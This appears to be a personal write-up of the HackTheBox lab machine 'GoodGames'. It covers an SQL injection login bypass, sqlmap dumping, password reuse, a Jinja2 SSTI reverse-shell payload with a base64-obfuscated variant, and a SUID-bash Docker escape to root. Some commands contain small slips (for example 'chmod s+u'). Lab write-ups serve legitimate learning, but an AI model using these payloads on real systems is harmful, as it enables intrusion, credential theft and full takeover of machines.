# This is the Writeup of the HackTheBox machine "GoodGames"

Well hello there! I just finished another HackTheBox machine called "GoodGames" and I decided to make my own writeup to better understand everything that has happened during my pwning. I have learned a couple of new things that honestly I thought work differently, but without further ado, let's start B)

The challenge obviously starts with doing an nmap scan. For this, I really like to use this command : `nmap -sV -Pn -sC -v -p- -oN scan 10.10.11.130` as `-sV` enables version detection, `-Pn` disables host discovery and treats all hosts as online, `-sC` enables script scanning using the default set of Nmap scripts, `-v` makes the output more verbose, `-p-` indicates that all ports will be scanned and `-oN scan` specifies the format and location for the output (that in this case is called "scan").

```Nmap scan report for 10.10.11.130
Host is up (0.023s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-title: GoodGames | Community and Store
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb
```


**Don't forget to add goodgames.htb to your /etc/hosts !!!**

Well, the scan didn't show much, so we begin to poke around the main site. What is interesting (for hackers, obviously...) is the login form. We need to provide email and password to be logged into our account. At first, I spend some time poking around with JWT tokens - but it was not the correct way of thinking. I gave up on trying to bruteforce/guess admin's password, as for logging we were using email address, which I didn't know (at this point). After looking up other writeups, it turned out that I should have tried the infamous **SQL INJECTION**. Apparently, even though we had to provide email address in loging form, if we used typical SQL injection payload `email=admin' or 1=1 -- -` we still got logged in as admin (sick!). Now that's a surprise! If we were able to exploit the `email` field with our famous payload, we could test it using tool called `sqlmap`. All we had to do was to intercept our burp request during loging, save it as `request.txt` and then use command like `sqlmap -r request.txt`. This results in a dumped database with usernames and password hashes. Bingo! Now we just need to crack the admin's password and we are ready to go!

I used one of my favourite sites for cracking common passwords: https://crackstation.net. It turns out that our admin uses a really weak password: "superadministrator". This is pathetic... But now we are able to log into the admin's account and try to find a way to mess things up. 
In admin's panel, we can find info about another site called `internal-administration.goodgames.htb` - **Remember to add this address to your /etc/hosts !!!** After visiting this page, we are greeted by a big login form called "_Flask Volt_". **_Remember that Flask is a web application framework written in python!_** I wonder... What if our admin was really lazy and used the same password couple of times?
Bingo!
We can log into the app!

Here comes the tricky part. I want to be completely honest with you, I lost my patience and looked up what to do next on some another writeup. But hey, that's probably why you are here! That's nothing to be ashamed of, we all have been there. At the end of the day, by overcoming new obstacles, you're learning many valuable things. But anyway - back to the point :)

In the `settings` section, you are able to set you username, date of birth and phone number. And remember this one thing: **IF YOU ARE PENTESTING A PYTHON ENVIRONMENT, THERE IS A BIG CHANCE OF _SSTI_ VULNERABILITY**. I'm not even a pentester, but that's how life works. If you see python - it will be either SSTI or some other deserialization. But now, when I am writing this writeup, it is easy to say I guess...
Well, back to the point. If you try a payload in a name field to be `{{7*7}}`, the generated name will be `49`. That's nice, we found vulnerability. Now you need to identify the Template Engine. There is a couple of ways to do this, but I really like this article: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
If you identify it correctly, you will know that we have just found the Jinja2 Template Engine! Now, let's craft a payload.
The most common payload looks like this: `{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/<ip>/<port> 0>&1').read()}}`, unfortunately, when I tried this, it didn't work. So, good way of thinking is to base64 encode our payload and use `${IFS}` as a `space` character. If we base64 encode our `bash -i >& /dev/tcp/<ip>/<port> 0>&1` part, our final payload would look like this: `{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}<BASE64 ENCODED PART>${IFS}|base64${IFS}-d${IFS}|bash').read()}}`.
Pheeew, that was intense!
Now let's setup a netcat listener using command `nc -lvnp 1337`, change name in the app to the previously given payload, and wat for magic to happen. Badaboom! We just landed our reverse shell!
But what has happened?? Why are we root immediately?? Why is there no root.txt flag??? I'll explain! We are in a docker container. You can know this after seeing that after using `ls -la`, you see the user id's instead of user name's when listing files. Also, when you use `mount` command, you can see that there is "augustus" home directory mounted to this docker. Let's check the IPv4 of our container! Hmmmm... Why is it 172.19.0.2 instead of 172.19.0.1? Is there something running on the 172.19.0.1? There is only one way to find out! And maybe, just maybe our user is really, really lazy, and has used the same password third time!? But to do this, we need to be able to use `ssh`. Now we are not. Try this command: `script /dev/null bash`. It will start a new interactive Bash shell session, but all the input and output of the session will be discarded. Now, after `ssh augustus@172.19.0.1` and using the same password as before, we are able to log in as augustus.

The last part of our journey is getting root access. Again, when you have access to a docker container with a mounted filesystem or ability to mount, you will probably need to clone a binary like /bin/bash and give it the SUID bit or something like this. So that's exactly what we will do! Let's go to the augustus home directory and copy the /bin/bash binary (`cp /bin/bash .`). Now let's use `logout` to go back to docker container. Look at this! There is our copied bash binary and we have root access and complete freedom in modyfing it's permissions! So nw, let's change the owner of this binary: `chown root:root bash`, then let's add SUID bit: `chmod s+u bash`. Now let's log again as augustus and if we did everything perfectly, you should be able to execute bash binary from augustus home directory with elevated privileges. If you execute `./bash -p`, you should become _root_.

Thank you so much for reading this writeup. This means a lot to me and I hope you learned something new, as I certainly did :) If you have any suggestions please write to me and I'll try to make my writeups better and better. See you!


